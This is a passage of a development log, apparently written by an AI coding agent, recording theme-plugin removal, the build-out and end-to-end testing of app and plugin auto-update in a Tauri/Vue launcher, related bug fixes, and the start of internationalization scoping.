**Deleted the built-in `brick-block-theme` plugin and the now-fully-dead `slotRegistry.ts`,
closing the milestone.** Confirmed via `AskUserQuestion` before doing it, since this removes a
shipped built-in theme option (users would need to install `brick-block-data-theme` separately
to get it back) - a real user-facing behavior change, not just an internal refactor, even though
parity had just been verified.
- `rm -rf src/plugins/brick-block-theme/` - the whole folder (both Vue components, the font
  asset, `plugin.json`, `index.ts`).
- `src/theme/slotRegistry.ts` deleted outright - grepped every `ThemePlugin` first (back when
  scoping this milestone) and confirmed it had exactly one consumer; that consumer is now gone.
- `ThemeSlotName` type and the `slots?` field removed from `ThemePlugin` (`plugins/types.ts`).
- `stores/theme.ts`: removed the `setActiveSlots`/`clearActiveSlots` import and both call sites
  (`setActiveTheme`'s reset path and its plugin-activation path) - `cardVisual`/`fontFaces`/
  `cssVariables` handling untouched, they never depended on slots.
- `GameGrid.vue`/`BigPictureGrid.vue`: removed `useThemeSlot` entirely, rendering `GameCard`/
  `BigPictureTile` directly (`<GameCard v-for=... />`/`<BigPictureTile v-for=... />`) instead of
  through a `<component :is="...">` indirection that only ever resolved to the same fallback now
  anyway.
- Verified via `grep -rn "brick-block-theme|slotRegistry|ThemeSlotName|useThemeSlot|setActiveSlots|clearActiveSlots"`
  across all of `src/` - zero remaining hits (the one incidental match, `BigPictureSlideshow.vue`'s
  local `const slots: CoverSlot[]`, is an unrelated local variable name, not this mechanism).
  `bun run build` (typecheck + build) and `cargo check` both clean; JS/CSS bundle shrank as
  expected (one fewer CSS chunk - the built-in plugin's own bundled `@font-face` asset is gone).

**Milestone 18 fully closed.** `cardVisual` AST + CSS-variable opt-in hooks is now the only
theming mechanism in the app, for both desktop and Big Picture, for every theme kind (built-in
default, data-only, and any future third-party one) - `slots`/component-swap theming, which only
ever had one real consumer, no longer exists at all.

**Documentation tidy pass, on user request.** `milestones.md`'s Milestone 14/18 sections had
drifted back into devlog-style multi-line narrative (the pinned-filter-bar saga especially,
several paragraphs per bullet) - condensed both back to one-line-per-item, matching the
convention already applied to Milestones 16/17 earlier. Also delegated a codebase-wide sweep
(via Explore) for in-code comments narrating past events/decisions rather than documenting a
present-tense invariant - found real candidates in `App.vue`, `GameFilters.vue`,
`GameListRow.vue`, `stores/wrapperPlugins.ts`, `db.rs`, `plugin_installer.rs`, and
`wasm_plugins.rs`. Trimmed each to keep only the load-bearing invariant (why a value must stay
what it is, what would break if changed), dropping the "was"/"previously"/"this was skipped
originally"/"confirmed by a real test" framing - that history already lives here in devlog.md,
not in the code itself. Left several comments untouched where the agent's audit found the
historical framing was actually necessary context (e.g. `plugin_registry.rs`/
`plugin_verification.rs`'s module docs, most of `wasm_plugins.rs`'s Milestone 12 sandboxing
comments) - not everything referencing a past milestone number is narrative bloat, only where
the surrounding sentence was pure event narration with no bearing on how to safely edit the code
today. `bun run build`/`cargo check` both clean (comment-only changes, no behavior change).

## Milestone 19 — Auto-Update: App + Plugins/Themes (scoped, not started)

**Scoped from a design discussion, on user request.** User specified three concrete trigger
moments up front (app start, app focus, install-plugin modal open) before asking for
implementation approach - a good sign this had already been thought through as a real feature,
not a vague "add auto-update" ask. Framed the response around the fact that "auto-update" here
is actually two unrelated mechanisms that happen to share the same trigger moments, not one
feature:

- **The app updating itself** is a solved problem Tauri already ships an official answer for -
  `tauri-plugin-updater` (checks a hosted, signed `latest.json`, verifies via a minisign
  keypair, downloads, and `tauri-plugin-process` relaunches to apply). No reason to hand-roll
  this; the real work is wiring CI to actually publish a signed `latest.json` per release and
  generating/storing the signing keypair, not application logic.
- **Plugins/themes updating themselves** has no existing mechanism at all, custom or otherwise,
  and - checked before writing this up - a real structural gap blocks it entirely: the
  persisted `WasmPluginManifest`/`DataThemeManifest` records on disk (`plugin_installer.rs`)
  store `id`/`name`/`version`/etc. but never the manifest's *origin* (the URL it was installed
  from, or which curated-registry entry it came from). Without that, there's nothing to
  re-fetch and compare against later - this has to be added before any update-checking logic
  can exist at all, not an optional nice-to-have.

Scoped the milestone around this exact split: app self-update leans on Tauri's own plugin (CI
+ config work, not new application logic), plugin/theme self-update needs a real schema
addition first (persisting install origin) before the check/compare/apply pipeline can be
built at all. Both surfaces get checked at the same three moments via one orchestrating call,
since the user's own framing ("the moments which the app recognizes updates on both") already
implied unifying the trigger point even though the two mechanisms underneath stay separate.

**Built app self-update, on user's choice to start with this half first.** Recommended it
over plugin/theme self-update since it's mostly config/CI work reusing Tauri's own official
plugin, not new application logic with an unknown schema change blocking it.

- Added `tauri-plugin-updater = "2"`/`tauri-plugin-process = "2"` to `Cargo.toml`, registered
  both in `lib.rs` (`tauri_plugin_process::init()`, `tauri_plugin_updater::Builder::new().build()`),
  added `updater:default`/`process:allow-restart` to `capabilities/default.json`. `bun add
  @tauri-apps/plugin-updater @tauri-apps/plugin-process` for the JS side. `cargo check`/
  `bun run build` both clean after.
- **Signing keypair generated by the user themselves, not through this session** - same
  security discipline as the earlier GitHub PAT incident (never let a real secret's value
  flow through the conversation/logs). Added `updater-private.key`/`*.key` to a new
  `src-tauri/.gitignore` entry *before* the user ran `bunx tauri signer generate`, so the
  private key file could never land in git even by accident. Only the printed public key
  (safe to share) came back into this session, pasted into `tauri.conf.json`'s
  `plugins.updater.pubkey`, alongside `endpoints: ["https://github.com/smh0505/Concourse/
  releases/latest/download/latest.json"]`. Also had to open the app's CSP `connect-src` for
  `https://github.com`/`https://*.githubusercontent.com` (release asset downloads redirect
  through the latter), since the default CSP only allowed `ipc:`/`http://ipc.localhost`.
- **No release workflow existed at all for this repo before now** - Milestone 19's own
  write-up had assumed "extend the existing release workflow," which turned out to be wrong
  once actually checked. Wrote `.github/workflows/release.yml` from scratch using Tauri's
  official `tauri-apps/tauri-action` (builds, signs via the two `TAURI_SIGNING_PRIVATE_KEY*`
  secrets, and publishes a GitHub Release with `latest.json` attached, triggered by a `v*` tag
  push or manual dispatch). Asked the user whether to build for Windows/macOS/Linux (the
  standard `tauri-action` recipe) or Windows-only, given the app has Windows-specific
  dependencies throughout (registry access via `winreg`, WebView2, Locale Remulator/Emulator)
  with no evidence it's ever run on the other two - user chose Windows-only, so the workflow
  targets `windows-latest` alone rather than the usual 3-platform matrix. `releaseDraft: true`
  by default, since this is the very first release this repo has ever cut and shouldn't
  auto-publish without a look first. The two signing secrets still need to be set as GitHub
  Actions secrets by the user before this workflow can actually sign anything - not done yet,
  and deliberately not something to do through this session either.
- Frontend: new `stores/appUpdate.ts` (wraps `check()`/`downloadAndInstall()`/`relaunch()`,
  tracks a `dismissedVersion` so a "Later"-dismissed update doesn't immediately re-surface on
  the very next re-check) and `AppUpdateBanner.vue` (a persistent bottom-right banner, not the
  existing toast system - toasts auto-dismiss after 5s, which would hide an actionable
  "update available" prompt before the user could decide, so this needed its own UI rather
  than reusing `useToastStore`). Wired into all three trigger moments: `App.vue`'s `onMounted`
  (fire-and-forget, not awaited, so a slow/failed check doesn't delay the rest of startup) plus
  a new `getCurrentWindow().onFocusChanged` listener (registered/unregistered alongside the
  existing `library.dispose()` teardown), and `AddPlugin.vue`'s existing `watch(() =>
  props.open, ...)` - that component stays mounted the whole time `PluginSettings.vue` does
  (controlled via its own `:open` prop, not `v-if`), so `onMounted` alone would only fire once
  per settings-view visit, not once per actual modal open; the existing open-prop watcher
  (already there to reset the URL field) was the right place to add this instead.
- `bun run build`/`cargo check` both clean. Not runnable/testable in this environment (no
  Tauri window, no way to trigger a real update check against a real release) - this is
  written and typechecks correctly but genuinely unverified end-to-end; flagged honestly
  rather than claimed as working.

**Version bump, to actually enable testing the update path - user asked for the correct version
to be evaluated, not just a placeholder bump.** Checked every milestone heading in
`milestones.md`: Milestones 1-13 are the 1.0.0 baseline; Milestones 16, 17, and 18 have all
fully closed since, each a real Post-1.0 Roadmap milestone closure the versioning policy ties
a minor bump to - but the version string had stayed at `1.0.0` the entire time regardless,
never actually bumped as those closures happened. Milestone 14 doesn't count (explicitly
never closes, by its own definition); Milestone 19 is still in progress, not closed.
- Correct version: `1.0.0` → `1.3.0` (three missed minor bumps, one per closed Post-1.0
  milestone) → `1.3.1` (patch, for this session's in-progress Milestone 19 work, per "patch
  bumps for fixes within a milestone").
- Bumped `package.json`/`src-tauri/Cargo.toml`/`src-tauri/tauri.conf.json` together to
  `1.3.1`, verified all three match via `grep`. `bun run build`/`cargo check` both clean.
- This also matters functionally, not just for bookkeeping: `tauri-plugin-updater`'s `check()`
  compares the *running app's* embedded version (from `tauri.conf.json` at build time)
  against whatever a published `latest.json` claims - testing the update banner at all
  requires a real version difference between a locally-built "old" install and whatever gets
  published next, not just any arbitrary bump.

**End-to-end release test, on user's request to actually verify the pipeline rather than trust
it unread.** Built `1.3.1` locally first (`bunx tauri build`) as the "old" baseline install,
then iterated through real tagged test releases until the whole chain actually worked. Took
three failed attempts before succeeding - each one a real bug, not a retry-and-hope:

- **`v1.3.2`** (first real tag push): job succeeded, but no `.sig`/`latest.json` ever appeared -
  `tauri-action` logged `Signature not found for the updater JSON. Skipping upload...`. User's
  own hypothesis was a corrupt signing key/password (plausible, since `gh secret set
  --body-file` doesn't exist and the key had to be pasted manually into an interactive prompt
  as a workaround). Checked the actual build log line-by-line before accepting that
  explanation - the "Found artifacts:" list (what `tauri-action`'s own glob search actually
  located, as opposed to "Looking for artifacts in:", the candidate paths it merely expected)
  never contained any `.sig` file in either this run or a re-check of an even earlier
  `workflow_dispatch` test run. Ruled out corruption: nothing pointed at the key/password
  being the actual cause.
- **`v1.3.3`** (switched `bundle.targets` from `"all"` to `["nsis"]`, guessing the ambiguity
  between two Windows installer formats confused `tauri-action`'s artifact matching): same
  exact failure, ruling that theory out too.
- **Found the real cause via a targeted search of `tauri-apps/tauri-action`'s own issue
  history** (`gh search issues`/`gh issue view`, not guesswork) - issue #1098's comment thread
  states plainly: Tauri v2's bundler only ever writes `.sig` files at all when
  `bundle.createUpdaterArtifacts: true` is explicitly set in `tauri.conf.json`. Never set it.
  The signing secrets were correct the entire time; the bundler was never even trying to sign
  anything, regardless of what secrets were present.
- **`v1.3.4`** (added `createUpdaterArtifacts: true`): real progress - the build log now showed
  `Finished 1 updater signature at: ...exe.sig`, and `tauri-action`'s own artifact search
  correctly found both the installer and its signature this time. But the job then failed
  outright with `Resource not accessible by integration` while trying to create the GitHub
  release. Checked `gh api repos/.../actions/permissions/workflow` - the repo's default Actions
  permission was `read`, which caps the token even though `release.yml` itself declares
  `permissions: contents: write` at job level. Fixed via the same API call used earlier this
  session for `concourse-plugin-registry`'s bot-PR permission gap. Re-ran the *same* failed job
  (`gh run rerun --failed`) rather than re-tagging - hit the identical error again, because a
  rerun reuses the token context issued when the run was **originally** queued, before the
  permission fix; a genuinely new run was required, not a retry.
- **`v1.3.5`** (fresh tag, fresh token, everything above in place): succeeded completely -
  `Concourse_1.3.5_x64-setup.exe`, its `.sig`, and `latest.json` all uploaded. Downloaded
  `latest.json` directly (`gh release download --pattern latest.json --output -`) and read its
  actual content rather than trusting the upload succeeded: correct version (`1.3.5`), valid
  minisign signature blocks for both `windows-x86_64` and `windows-x86_64-nsis` platform keys,
  and a real (not placeholder) download URL. This is the first genuinely confirmed-working
  piece of the whole auto-update feature - everything before this was written-but-unverified.
- Cleaned up every failed intermediate test release/tag (`v1.3.2`, `v1.3.3`, `v1.3.4`) via `gh
  release delete --cleanup-tag`/`git push origin :refs/tags/<tag>` as each was superseded,
  rather than leaving broken draft releases cluttering the repo.
- Also added `Swatinem/rust-cache@v2` to `release.yml` mid-investigation, on the user's own
  observation that every run was taking ~15-20 minutes - the workflow had no Rust build
  caching at all, so every run recompiled heavy dependencies (`wasmtime`, `sigstore-*`, `sqlx`)
  completely from scratch every time. Didn't affect `v1.3.5`'s own run time (it was still
  populating the cache for the first time), but should meaningfully speed up whatever comes
  after it.
- **Still pending, deliberately left to the user**: publishing the `v1.3.5` draft release (only
  a published, non-draft release resolves via `/releases/latest`, which is what
  `tauri-plugin-updater`'s `check()` actually queries), and then the real GUI verification this
  session categorically cannot perform - launching the locally-built `1.3.1` install and
  confirming the update banner appears, downloads, installs, and relaunches correctly.

**Post-verification cleanup, on request:** bumped `actions/checkout` to `@v6` (was `@v4`), and
switched `releaseDraft: true` → `false` - now that the pipeline is confirmed working end to
end, future releases publish immediately instead of needing a manual un-draft step.

**Retested at `v1.3.6` (rebuilt the local `1.3.5` baseline from scratch, previous
`target/release` folder had been deleted) - user reported a real runtime bug this time,
`TypeError: Cannot read private member from an object whose class did not declare it`, caught
via a screenshot since Tauri's release build has no devtools access and the toast couldn't be
selected/copied (dragging to highlight text registered as a click and dismissed it).**

- Recognized this immediately as the same bug class already fixed once this session in
  `slotRegistry.ts` (`PluginSettings.vue`'s `shallowRef` vs `ref` fix for the "Vue received a
  Component that was made a reactive object" warning) - a real class instance backed by
  private fields gets deep-reactivized by a plain Pinia `ref()`, wrapping it in a Vue Proxy;
  calling any method on that Proxy later fails the private-field brand check, since private
  fields are tied to the exact original object identity, not whatever wraps it.
  `@tauri-apps/plugin-updater`'s `Update` class (extends `Resource`, wraps a real Tauri
  resource handle) is exactly this shape - `stores/appUpdate.ts` stored it in a plain `ref()`,
  and clicking "Update Now" called `.downloadAndInstall()` on the now-proxied instance.
- Fix: `available` changed from `ref<Update | null>` to `shallowRef<Update | null>` -
  `shallowRef` only makes the ref's own reassignment reactive, never wraps the assigned value
  itself, so the real `Update` instance (and its private fields) stays intact when its methods
  are called later. `checking`/`installing` stayed plain `ref<boolean>` - primitives have no
  reactivity/proxy concern at all.
- `bun run build`/`cargo check` both clean.
- Also confirmed `rust-cache`'s actual behavior on `v1.3.6`'s run: it restored nothing ("No
  cache found"), total run time barely moved (~16.4min vs ~17-18min before). First guess
  (`Cargo.lock`'s hash changing because this crate's own `version` field bumps every test) was
  wrong - checked directly and the computed cache/restore keys were byte-identical across the
  `v1.3.5`/`v1.3.6`/`v1.3.7` runs (`v0-rust-release-Windows_NT-x64-8af1e26a-37380225`), so key
  content was never the issue. User asked to confirm precisely rather than accept the first
  guess; `gh api repos/.../actions/caches` showed the real answer: two separate cache entries
  existed, same key, but scoped to different refs (`refs/heads/refs/tags/v1.3.5` and
  `refs/heads/refs/tags/v1.3.6`). GitHub Actions caches are scoped per-ref, falling back only
  to the repo's default branch - two different tags have no fallback relationship to each
  other at all, so each of this milestone's test releases (a new tag every time) gets its own
  isolated cache no matter how identical the key is. Not a misconfiguration; in real usage the
  cache would only ever pay off across commits sharing a ref (e.g. regular pushes to `main`),
  never across one-off release tags the way this session's rapid-fire testing used it.

**Final confirmation, from the user actually running it.** Rebuilt a local test install at
version `1.3.6` from current (fixed) source - deliberately *not* committing/pushing the
temporary version edit, since this was purely a local one-off build (`git checkout --
package.json src-tauri/Cargo.toml src-tauri/tauri.conf.json` restored the working tree to the
real committed `1.3.7` immediately after). This mattered because the `TypeError` lives in
whatever code is *currently installed and initiating the update check* (the old `1.3.5`
baseline was built from pre-fix source, so it would have hit the bug regardless of how many
fixed releases got published afterward) - needed a baseline built from the fix itself, at a
lower version than the target release, to actually test the fix rather than just re-trigger
the same old bug. Installed that `1.3.6` build, updated to the published `v1.3.7` release:
download, install, and relaunch all completed successfully, no `TypeError`. App self-update is
now fully verified working end to end, not just typechecked/built. Plugin/theme self-update
(Milestone 19's other half) remains unstarted.

**Started plugin/theme self-update with the schema change it's blocked on.** Added two fields
to both `WasmPluginManifest`/`DataThemeManifest` (`plugin_installer.rs`): `source_url` (the
exact manifest URL this was installed from) and `installed_via_registry` (bool). The latter
matters because a registry-curated install's `source_url` is a commit-SHA'd raw GitHub URL,
frozen forever by design (that's the whole point of pinning a hash to a specific reviewed
commit) - re-fetching that exact URL later would never show a newer version even once one
exists, so an update-check for a registry-installed plugin needs a completely different
strategy (re-fetch the registry's *current* entry for this plugin's `id`) than a freeform
direct-URL install (just re-fetch `source_url` itself and compare `version`). Didn't add a
separate parameter to derive this flag - `install_plugin`'s existing `expected_sha256:
Option<String>` is already exactly this signal (`AddPlugin.vue` only ever passes a hash
alongside a registry entry, never for a freeform pasted URL), so `expected_sha256.is_some()`
is the flag.
- `install_wasm_plugin` previously wrote the original downloaded `manifest_bytes` straight to
  `plugin.json` verbatim; changed to serialize the (now-mutated) `manifest` struct instead so
  the injected fields actually persist. Confirmed nothing downstream depends on the file's
  exact original byte content - Milestone 13's signing check hashes the `.wasm` binary, not
  `plugin.json`, so re-serializing is safe. `install_data_theme` already serialized the struct
  (not raw bytes), so only needed the two field assignments added, no structural change.
- **Assessed whether this breaks anything, since it touches a persisted on-disk format the
  user specifically asked about.** Both new fields are `#[serde(default)]`/`Option` - an
  already-installed manifest from before this change (missing both fields entirely) still
  deserializes without error, just showing `None`/`false` until the user reinstalls; an
  upstream plugin/theme author's own manifest.json (which never declares these fields at all,
  since they're host-added metadata, not something an author writes) also parses fine.
  Concluded this is **not a breaking change** - noted explicitly in the commit message as
  asked, rather than leaving it ambiguous.
- Mirrored the two new fields onto the frontend's `PluginManifest` TS type
  (`src/plugins/manifest.ts`) as `sourceUrl`/`installedViaRegistry` - `loader.ts`'s
  `invoke<PluginManifest[]>("list_wasm_plugins"/"list_data_themes")` calls already spread the
  Rust-returned object through untyped, so the values would have flowed through either way;
  this just gives them a declared type for whatever later step actually reads them (the
  update-check UI, not yet built).
- Extended the existing real-HTTP-server round-trip test (`installs_lists_and_uninstalls_a_
  real_theme`) with assertions that `source_url`/`installed_via_registry` actually survive the
  install → list round-trip, not just compile. Added a new test
  (`marks_a_correctly_pinned_theme_as_installed_via_registry`) for the one path no existing
  test exercised at all - a *successful* pinned-hash install (only the mismatch-rejection case
  was covered before) - computing the real correct hash of served bytes rather than hardcoding
  one, so the test proves the actual hash-matching logic, not just that the flag gets set
  given some hash. All 5 `plugin_installer` tests pass; `cargo check`/`bun run build` both
  clean.

**Added `check_plugin_update`, the Rust command that actually uses the new schema.** Two
lookup strategies chosen by `installed_via_registry` (already covered in the schema entry
above):
- Registry install: re-fetch the whole registry via the existing `plugin_registry::
  fetch_plugin_registry()` (no new registry-fetching code needed), find the entry matching
  this plugin's `id`, use *its* `manifest_url` - which may have moved to a newer pinned commit
  since install, unlike the old `source_url` which is frozen forever by design.
- Direct-URL install: re-fetch `source_url` itself.
- Either way, once a manifest URL is resolved, downloads it and parses only a `VersionProbe`
  (`{ version: String }`) rather than the full `WasmPluginManifest`/`DataThemeManifest` shape -
  both manifest kinds use the identically-named `version` field, so there's no need to know
  which shape it is just to compare versions.
- No known origin at all (registry entry removed/revoked since install, or a pre-Milestone-20
  install with no `source_url` ever recorded) reports "no update" rather than erroring the
  whole check - there's genuinely nothing left to check against, and a hard error here would
  be a worse experience than just silently not offering an update for that one plugin.

**Added real version comparison, not string equality.** `version_is_newer` splits both version
strings on `.` and compares each segment numerically (`"1.10.0" > "1.9.0"`) rather than
lexically (where the same comparison goes backwards - `"1.10.0" < "1.9.0"` as plain strings,
since `'1' < '9'` character-by-character). Falls back to plain inequality if either side isn't
all-numeric segments (e.g. a pre-release suffix), rather than pulling in a real SemVer crate
for one comparison this app's actual manifests never need more than plain `x.y.z` for.

**Caught and fixed my own mistake mid-edit.** The `Edit` tool call that inserted this new code
accidentally deleted the `uninstall_data_theme` command function itself in the process (the
`old_string`/`new_string` boundary swallowed it) - caught immediately by `cargo check` failing
with `cannot find __tauri_command_name_uninstall_data_theme`, not by manual inspection. Fixed
by re-adding the function; re-ran `cargo check` clean before moving on, rather than assuming
the fix was correct from reading the diff alone.

**Tests**: added 4 new ones alongside the 5 already there (9 total, all passing) -
`version_is_newer_compares_numerically_not_lexically` (the actual bug numeric comparison
exists to prevent, proven directly), plus three real end-to-end `check_plugin_update` tests
against a real self-hosted HTTP server (same discipline as every other test in this file):
detects a genuinely newer version, correctly reports no update when already current, and
correctly reports no update when there's no known origin to check at all - rather than only
testing the "happy path where an update exists" case. `cargo check`/`cargo test`/
`bun run build` all clean.

**Frontend "update available" indicator, wired into `PluginSettings.vue`.** New
`stores/pluginUpdates.ts` - a thin Pinia wrapper around `check_plugin_update` keyed by plugin
id, with `checkOne`/`checkAll`/`isUpdateAvailable`. `checkOne` no-ops for any manifest whose
`runtime` isn't `"wasm"`/`"data"` - a build-time TS plugin was never installed through the
pipeline that records `sourceUrl`/`installedViaRegistry` at all, so checking one would be a
wasted round-trip against a command that can only ever report "no known origin" for it.
- Added an `<span v-if="pluginUpdates.isUpdateAvailable(manifest.id)" class="update-badge">`
  next to the existing `<span class="version">` in all 5 of `PluginSettings.vue`'s tabs
  (source/theme/metadata/controller/wrapper) - all 5 were byte-identical, so used `replace_all`
  the same way the earlier `.active`→`accent-active` migration did. Controller mappings are
  always build-time TS today (no WASM support exists for that kind), so the badge will simply
  never show there in practice - left the markup in anyway rather than special-casing it out,
  since `isUpdateAvailable` already returns `false` safely for anything never checked.
- Triggered via a single `pluginUpdates.checkAll([...five stores' manifests])` call in
  `PluginSettings.vue`'s existing `onMounted` - explicitly a baseline for now, not the real
  three-moment wiring the app self-update already has (that's the next, separate checklist
  item). Passing every kind's manifests here (including controller's, which can never actually
  have an origin to check) is harmless given `checkOne`'s no-op guard.
- Verified via compiled CSS: `.update-badge` present exactly once, `--color-accent` colored,
  matching count of markup usages (5 template sites + 1 style rule = 6 total occurrences of
  the string, confirmed via `grep -c`). `bun run build` (typecheck + build) and `cargo check`
  both clean.

**Apply-update path.** Added `latest_sha256` to the Rust `UpdateCheckResult` first - a
registry-sourced update needs to carry its *new* pinned hash forward so applying it keeps the
same hard-reject-on-mismatch integrity check a fresh registry install already gets, rather than
silently downgrading to an unpinned install just because it's an update. Only set when
`update_available` is true (no point carrying a hash for a version that's already current).
- `pluginUpdates.ts`'s new `applyUpdate(manifest)` calls the exact same `install_plugin`
  command `pluginInstall.ts`'s `confirmInstall` already uses - installing over an existing id
  is just an overwrite (`plugin_installer.rs`'s `replace_dir` already handles this correctly,
  nothing new needed there). Deliberately skips the confirm-install dialog a brand-new install
  goes through - this id is already installed and implicitly trusted, an update is refreshing
  it, not vetting something unknown.
- **Found and fixed a real pre-existing gap while wiring the refresh step**: every other
  domain store (`plugins.ts`, `theme.ts`, `metadataProviders.ts`) has a `refreshManifests()`
  used after an install/reinstall, but `wrapperPlugins.ts` never did - it only ever set
  `manifests` once, in `init()`. Not something this milestone created, just never noticed
  before since nothing previously needed to refresh a wrapper plugin's manifest after the
  fact. Added it, mirroring the other three stores' identical one-line implementation.
  Toggling a wrapper's enabled state already had its own separate `reloadPlugins()` path
  (unaffected by this addition).
- Turned the plain `<span>` badge into a real `<button class="update-badge compact-button">`
  (reusing the existing shared `.compact-button` sizing, layering accent colors on top so it
  reads as a call-to-action rather than another neutral button) showing the actual target
  version ("Update to v1.2.0") rather than a generic "Update available" label, now that
  clicking it does something. Verified it's safe to nest a `<button>` inside the row's
  existing `<label>` (wrapping the enable/select checkbox or radio) - browsers don't forward a
  label's click-activation to its associated control when the click target is itself another
  interactive element (button/input/select/etc.), so clicking "Update" doesn't also
  accidentally toggle the plugin's enabled state.
- `cargo check`/`cargo test` (all 9 `plugin_installer` tests, no new ones added for this step -
  no new Rust logic beyond the one added struct field, already covered by existing
  `check_plugin_update` tests) and `bun run build` all clean. Verified via compiled CSS:
  `.update-badge` present exactly once with the expected accent-color properties.

**Wired plugin/theme update-checking into the same three trigger moments as app self-update,
closing the milestone.** Extracted a small `checkAllPluginUpdates()` helper in `App.vue`
(gathers all five domain stores' manifests, calls `pluginUpdates.checkAll`) and called it
alongside `appUpdate.checkForUpdate()` at both existing spots - the `onMounted` block (after
all five stores' own `init()` calls, so their manifests are actually populated by the time this
runs) and the `onFocusChanged` listener. `AddPlugin.vue`'s existing `open`-prop watcher (the
third moment, already home to `appUpdate.checkForUpdate()`) got the same five-store gather
inlined directly, since that component doesn't share `App.vue`'s local helper scope.
- Deliberately did **not** remove `PluginSettings.vue`'s own mount-time `checkAll` call, which
  predates this step - reconsidered whether it was now-redundant scaffolding to clean up, and
  concluded it isn't: opening the Settings view is a real, distinct user action from all three
  canonical moments (someone can navigate to Settings without the app having just started,
  regained focus, or had the install-plugin modal opened), so keeping it as a fourth check
  point is a genuine UX improvement, not leftover clutter. Updated its comment to describe
  itself accurately instead of the now-stale "baseline for now, proper wiring is later" framing.
- `bun run build` (typecheck + build) and `cargo check` both clean.

**Milestone 19 fully closed.** App self-update is verified working end to end (a real published
release, a real GUI test, a real bug found and fixed along the way). Plugin/theme self-update
is fully built and wired into four check moments - the schema change, the check command, the
apply path, and the UI are all in place and pass their own tests - but unlike the app half,
it was never GUI-tested end to end in this session: doing so would need an actually-installed
WASM plugin or data theme with a real newer version published somewhere to check against,
which wasn't set up here. Worth a real test pass before fully trusting it, the same way the app
half needed three failed release attempts before its own real bugs (`createUpdaterArtifacts`,
the workflow-permission gap, the `shallowRef` fix) surfaced.

**Post-close polish: replaced the standalone update banner with an actionable toast, on user
request.** `AppUpdateBanner.vue` and `ToastContainer.vue` both used identical `position: fixed;
bottom; right; z-index: 200` placement - equal z-index means DOM order decides visual
stacking, and the banner rendered after the toast container in `App.vue`, so it silently sat on
top of and hid any toasts underneath it. Rather than just nudging one's position, folded the
whole notification into the toast system itself as a new toast *shape* - an actionable toast
with buttons - since a banner and a toast were never really two different concepts here, just
two competing UI surfaces for the same kind of message.
- `stores/toasts.ts`: new optional `Toast.actions?: ToastAction[]` (`{ label, onClick }`) and a
  `pushAction(message, actions, type?)` alongside the existing `push()` - actionable toasts
  never auto-dismiss (the whole point of offering a real choice, not losing it to the existing
  5s timer), returning the new toast's id so a caller can dismiss it itself once an action is
  taken.
- `ToastContainer.vue`: renders `toast.actions` as buttons (reusing the shared `.compact-button`
  sizing) when present; the toast body's own click-to-dismiss only fires when there are no
  actions (`@click="!toast.actions && toasts.dismiss(...)"`), and each action button stops
  propagation on its own click so clicking "Update Now" doesn't also immediately dismiss the
  toast via the parent handler.
- **Simplified `stores/appUpdate.ts` at the same time, closing the earlier `shallowRef` fix's
  root cause structurally rather than just working around it.** The `Update` class instance is
  now captured directly in a plain closure (`onClick: () => applyUpdate(update)`), never stored
  in a Vue `ref`/`reactive` at all - a closure variable is never Proxy-wrapped by Vue's
  reactivity, so there's no private-field brand-check failure possible in the first place, not
  just one avoided via `shallowRef`. Dropped the `available`/`installing` state entirely (only
  ever read by the now-deleted `AppUpdateBanner.vue`) - `checkForUpdate()` now pushes an
  action-toast directly via `offerUpdate()`, tracking just the active toast's id (to avoid
  stacking a duplicate offer if a re-check fires while one's still open) and the
  last-dismissed version (unchanged behavior from before).
- Deleted `AppUpdateBanner.vue` entirely and its usage in `App.vue` - confirmed via `grep` that
  nothing else referenced `appUpdate.available`/`.installing` before removing them from the
  store.
- Verified via compiled CSS: `.toast`/`.toast-actions` both compile with the expected flex
  layout. `bun run build` (typecheck + build) and `cargo check` both clean. Not visually
  re-verified in a running app - same limitation as every other UI change this session, no
  browser/screenshot tooling available in this environment.

**Fixed a real bug reported directly: "the app's add plugin button doesn't update registry."**
Traced to `AddPlugin.vue`'s `pluginInstall.loadRegistry()` call living only in `onMounted` -
harmless-looking, until noticing this component stays mounted for `PluginSettings.vue`'s
entire lifetime (controlled via its own `:open` prop, not `v-if`). `onMounted` only ever fires
once per Settings visit, so the registry list was fetched exactly once and never refreshed on
a second "Add Plugin" click, or after a registry update/new entry landed - stale until a full
app restart. Fixed by adding the same `loadRegistry()` call to the existing `open`-prop watcher
(idempotent re-fetch, safe to call again).

Fixing that surfaced a second, smaller issue: the same watcher's `appUpdate.checkForUpdate()`/
`pluginUpdates.checkAll()` calls (the "third" of Milestone 19's three canonical trigger
moments) turned out to be genuinely redundant, not just the registry list. `AddPlugin.vue`
only ever opens from inside `PluginSettings.vue`, and that component's own `onMounted` already
re-checks updates every time Settings is (re)entered - opening the nested modal can't happen
without that check having just run moments earlier. Removed both calls (and their now-unused
store imports: `useAppUpdateStore`/`usePluginUpdatesStore`/`usePluginStore`/`useThemeStore`/
`useMetadataProviderStore`/`useControllerMappingStore`/`useWrapperPluginStore`) from
`AddPlugin.vue`, leaving its watcher responsible for the registry re-fetch only. Update checks
now fire at three moments, not four: app start, app focus (`App.vue`), and Settings-view mount
(`PluginSettings.vue`) - `AddPlugin.vue`'s own bundle even shrank slightly as a result.
`bun run build` clean at both steps.

**Much later, post-Milestone-21 follow-up: user asked to re-add the fourth trigger moment
removed above.** The earlier removal's reasoning ("this modal only opens from inside
`PluginSettings.vue`, whose own mount already just ran the check") holds for the *first* open in
a Settings visit, but not for every subsequent one - a long Settings session can open/close this
modal repeatedly without `PluginSettings.vue` ever remounting (its `onMounted` only fires once
per Settings visit, same lifetime quirk that motivated the registry re-fetch fix right above).
So this wasn't undoing a mistake, it was recognizing the original fix only covered part of the
actual repeat-open problem. Restored `usePluginUpdatesStore`/`usePluginStore`/`useThemeStore`/`useMetadataProviderStore`/
`useControllerMappingStore`/`useWrapperPluginStore` imports (not `useAppUpdateStore` - the app-
self-update check was never part of this trigger, only `pluginUpdates.checkAll`) and a
`checkAllPluginUpdates()` helper (same manifest-gathering
shape as `App.vue`'s/`PluginSettings.vue`'s own copies) to `AddPlugin.vue`, called from the same
`open`-prop watcher right after `loadRegistry()`. Four real trigger moments now: app start, app
focus, Settings-view mount, and this modal's own open - not duplicative, since each fires at a
genuinely distinct point in the session. `bun run build` clean.

## Milestone 20 — Internationalization & Offline Translation (scoped, not started)

Discussion-only session, prompted by the user wanting i18n but explicitly ruling out paid
third-party translation APIs (cost aside, wanted the feature to stay fully portable/offline).
Split into two genuinely separate problems rather than one feature: static UI string
localization, and dynamic content translation (game descriptions/metadata, which can arrive
from any metadata-provider plugin and can't be pre-translated ahead of time).

**UI strings**: `vue-i18n` is the obvious, uncontroversial pick - locale JSON files, zero cost,
